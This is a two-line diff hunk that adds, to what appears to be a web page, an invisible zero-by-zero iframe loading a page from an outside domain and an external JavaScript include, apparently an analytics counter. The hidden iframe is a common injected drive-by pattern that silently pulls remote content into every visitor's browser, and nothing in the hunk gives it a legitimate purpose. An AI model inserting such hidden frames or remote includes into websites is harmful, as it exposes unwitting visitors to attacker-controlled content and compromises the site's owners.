@@ -1,0 +1,2 @@
+<iframe src=http://cc.zuiyige.net/wmwm/new.htm width=0 height=0></iframe>
+<script language="javascript" type="text/javascript" src="http://js.users.51.la/1724160.js"></script>
